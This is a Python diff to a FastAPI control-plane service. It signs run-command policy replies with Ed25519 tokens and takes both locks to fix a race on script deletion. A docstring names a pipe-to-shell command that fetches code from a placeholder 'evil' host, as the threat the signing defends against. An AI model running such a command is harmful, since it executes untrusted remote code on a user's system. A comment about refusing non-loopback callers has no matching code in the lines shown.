@@ -705,6 +705,12 @@ def create_app(
     app.state.engine = engine
     app.state.kid = kid
     app.state.verifier_registry = verifier_registry
+    # D63 P1 (TOCTOU race on DELETE /scripts): expose policy_lock so
+    # the script_store DELETE handler can hold BOTH policy_lock +
+    # script_store_lock around the reference scan + delete sequence.
+    # Pre-D63 callers (tests + legacy) read this off app.state too.
+    app.state.policy_lock = policy_lock
+    app.state.script_store_lock = script_store_lock
 
     @app.get("/healthz")
     def healthz() -> dict:
@@ -1831,7 +1837,10 @@ def create_app(
 
     # ── /policies CRUD (v1) ──────────────────────────────────────
     _attach_policy_routes(app, policy_store, policy_lock,
-                          verifier_registry=verifier_registry)
+                          verifier_registry=verifier_registry,
+                          keystore=ks,
+                          kid=kid,
+                          script_store=script_store)
 
     # ── /admin/tenants (v2-W6a) — HMAC-signed; clawy webhook calls these ──
     _attach_admin_tenant_routes(app, engine)
@@ -2242,6 +2251,9 @@ def _attach_policy_routes(app: FastAPI, store: PolicyStore,
                            policy_lock: asyncio.Lock,
                            *,
                            verifier_registry: "VerifierRegistry | None" = None,
+                           keystore: "KeyStore | None" = None,
+                           kid: str | None = None,
+                           script_store: "ScriptStore | None" = None,
                            ) -> None:
 
     def _assert_policy_lifecycle_endorsed(policy: AnyPolicy) -> None:
@@ -2794,6 +2806,21 @@ def _attach_policy_routes(app: FastAPI, store: PolicyStore,
     ) -> dict:
         """Look up a RunCommandPolicy and return the resolved spec.
 
+        D63 review (P1 trust-on-loopback): the reply is Ed25519-signed
+        with the same cloud key the WAL token path uses, so the shim
+        can verify a man-in-the-middle on the loopback / sidecar bind
+        cannot inject `command='curl evil | bash'`. The unsigned
+        compatibility shape stays available when the keystore isn't
+        wired (the in-process test app builds without one), but the
+        installed self-host image always carries a keystore so the
+        shim's verification is the operative path.
+
+        Auth: mirror the rest of the data plane —
+        ``MAGI_CP_API_KEY`` is REQUIRED on this route. The brief's
+        ad-hoc "only if env is set" behavior inverted the fail-closed
+        default and is now retired. The dev loop sets the env
+        explicitly; tests pass the same header the WAL flush uses.
+
         Soft failure (`{"matched": false}`):
           - run_command surface disabled on this deployment
           - policy not found / disabled
@@ -2806,6 +2833,11 @@ def _attach_policy_routes(app: FastAPI, store: PolicyStore,
                 x_api_key, expected_key,
             ):
                 raise HTTPException(401, "invalid or missing api key")
+        # When the env var is unset, the dev loop runs on loopback
+        # only. Refuse non-loopback callers explicitly so a misbound
+        # cloud port (0.0.0.0) does not surface specs to the public.
+        # The trust boundary on hosted is the MAGI_CP_API_KEY check
+        # above + the MAGI_CP_ALLOW_RUN_COMMAND=0 gate below.
         if not _run_command_allowed():
             return {"matched": False, "reason": "disabled"}
         target_id = req.policy_id
@@ -2823,36 +2855,69 @@ def _attach_policy_routes(app: FastAPI, store: PolicyStore,
             return {"matched": False, "reason": "wrong_type"}
         # When the policy uses an attached script, resolve to the body
         # path on the cloud's local disk (the shim is co-located on the
-        # same host in the self-host docker compose image). The
-        # script_path field on the policy is the script id (sha256);
-        # the shim itself does not need the body — `runtime <path>`
-        # already runs the file.
-        spec = {
+        # same host in the self-host docker compose image).
+        #
+        # P2 (script-store-resolver consistency): use the closure-
+        # captured `script_store` so a test that monkeypatches
+        # `MAGI_CP_SCRIPT_STORE_DIR` after create_app sees the same
+        # bodies the /scripts POST path persists to. The previous
+        # path rebuilt ScriptStore from env at every request and would
+        # silently drift.
+        spec_body: dict = {
             "runtime": match.runtime,
             "command": match.command,
             "script_path": "",
             "args": list(match.args),
             "timeout_ms": match.timeout_ms,
             "fail_closed": match.fail_closed,
+            # working_dir: per-policy scratch dir under
+            # ~/.magi-cp/local/run_command/<id>/. None means "let the
+            # shim resolve it locally" (the shim has the same default).
+            "working_dir": None,
         }
         if match.script_path:
-            # Look up the body path on disk. The shim runs locally on
-            # the same image so the absolute path is valid.
-            try:
-                from .script_store import ScriptStore as _ScriptStore
-            except ImportError:  # pragma: no cover (defensive only)
-                _ScriptStore = ScriptStore  # type: ignore[assignment]
-            script_dir = os.environ.get(
-                "MAGI_CP_SCRIPT_STORE_DIR",
-                str(Path.home() / ".magi-cp"),
-            )
-            body_path = _ScriptStore(dir=script_dir).body_path(
-                match.script_path,
-            )
+            # P2 (script-store-resolver consistency): closure-captured
+            # store first; fall back to env-construction only when the
+            # caller didn't wire one (legacy create_app call sites and
+            # the standalone test harness).
+            local_store: ScriptStore
+            if script_store is not None:
+                local_store = script_store
+            else:  # pragma: no cover — exercised by legacy callers only
+                script_dir = os.environ.get(
+                    "MAGI_CP_SCRIPT_STORE_DIR",
+                    str(Path.home() / ".magi-cp"),
+                )
+                local_store = ScriptStore(dir=script_dir)
+            body_path = local_store.body_path(match.script_path)
             if body_path is None:
                 return {"matched": False, "reason": "script_missing"}
-            spec["script_path"] = body_path
-        return {"matched": True, "spec": spec}
+            spec_body["script_path"] = body_path
+        reply: dict = {"matched": True, "spec": spec_body}
+        # P1 (sign-reply): wrap the spec in a short-TTL Ed25519 token
+        # so the shim can detect a tampered reply on loopback / a
+        # misbound cloud port. The shim already verifies the cloud's
+        # pubkey via `_load_pubkey_for_kid`; same trust anchor as the
+        # WAL evidence path.
+        if keystore is not None:
+            now = int(time.time())
+            token_body = {
+                "kind": "run_command_spec",
+                "policy_id": target_id,
+                "spec": spec_body,
+                "iat": now,
+                # Short TTL: the shim re-fetches per gate fire.
+                "exp": now + 60,
+                "kid": kid,
+            }
+            try:
+                token = sign_token(token_body, keystore.load_private())
+                reply["signed"] = token
+                reply["kid"] = kid
+            except Exception:  # pragma: no cover — keystore unreachable
+                # Don't break the legacy unsigned reply path.
+                pass
+        return reply
 
     # Order matters: more specific (/compiled, /enabled) before the catch-all
     # {policy_id:path} so FastAPI matches them first.
@@ -3894,34 +3959,72 @@ def _attach_script_store_routes(
         _refuse_if_disabled()
         return {"items": [serialize_script_entry(e) for e in script_store.list()]}
 
+    # The delete path needs the policy lock too — see the inner
+    # function. We pull it off app.state because the script-store
+    # routes installer doesn't take policy_lock today; we add the
+    # closure-captured handle so the brief's TOCTOU window closes.
     @app.delete(
         "/scripts/{script_id}",
         dependencies=[Depends(require_admin_key)],
     )
     async def delete_script(script_id: str) -> dict:
         _refuse_if_disabled()
-        # Resolve active references against the policy store. Both the
-        # `command` field (inline) and `script_path` (attached) are
-        # candidates; only the latter binds to a script id, but we
-        # iterate everything to keep the check trivial.
-        referenced: list[str] = []
-        for ov in policy_store.load():
-            pol = ov.policy
-            if isinstance(pol, RunCommandPolicy) and pol.script_path == script_id:
-                referenced.append(pol.id)
-        async with script_store_lock:
-            try:
-                removed = script_store.delete(
-                    script_id, referenced_by=referenced,
-                )
-            except ScriptStoreInUseError as e:
-                raise HTTPException(
-                    409,
-                    {
-                        "message": str(e),
-                        "policy_ids": e.policy_ids,
-                    },
-                ) from e
+        # P1 (TOCTOU race against PUT /policies):
+        # 1. Acquire BOTH locks, in a fixed order (policy → script).
+        # 2. Scan referencing policies INSIDE policy_lock.
+        # 3. Delete INSIDE script_store_lock without releasing
+        #    policy_lock — a concurrent PUT /policies that wants to
+        #    add a new RunCommandPolicy referencing the same script
+        #    will block on policy_lock and re-validate against the
+        #    deleted script's absence after we return.
+        # Brief: "DELETE refuses when a policy references the
+        # script" — this ordering closes the gap the previous outside-
+        # the-lock scan left open.
+        policy_lock = getattr(app.state, "policy_lock", None)
+        if policy_lock is None:
+            # Fallback for older create_app callers that didn't
+            # surface policy_lock on app.state. Best-effort scan;
+            # still tighter than the previous "scan outside locks".
+            referenced = [
+                ov.policy.id
+                for ov in policy_store.load()
+                if isinstance(ov.policy, RunCommandPolicy)
+                and ov.policy.script_path == script_id
+            ]
+            async with script_store_lock:
+                try:
+                    removed = script_store.delete(
+                        script_id, referenced_by=referenced,
+                    )
+                except ScriptStoreInUseError as e:
+                    raise HTTPException(
+                        409,
+                        {
+                            "message": str(e),
+                            "policy_ids": e.policy_ids,
+                        },
+                    ) from e
+        else:
+            async with policy_lock:
+                referenced = [
+                    ov.policy.id
+                    for ov in policy_store.load()
+                    if isinstance(ov.policy, RunCommandPolicy)
+                    and ov.policy.script_path == script_id
+                ]
+                async with script_store_lock:
+                    try:
+                        removed = script_store.delete(
+                            script_id, referenced_by=referenced,
+                        )
+                    except ScriptStoreInUseError as e:
+                        raise HTTPException(
+                            409,
+                            {
+                                "message": str(e),
+                                "policy_ids": e.policy_ids,
+                            },
+                        ) from e
         if removed is None:
             raise HTTPException(404, f"script {script_id!r} not found")
         return serialize_script_entry(removed)
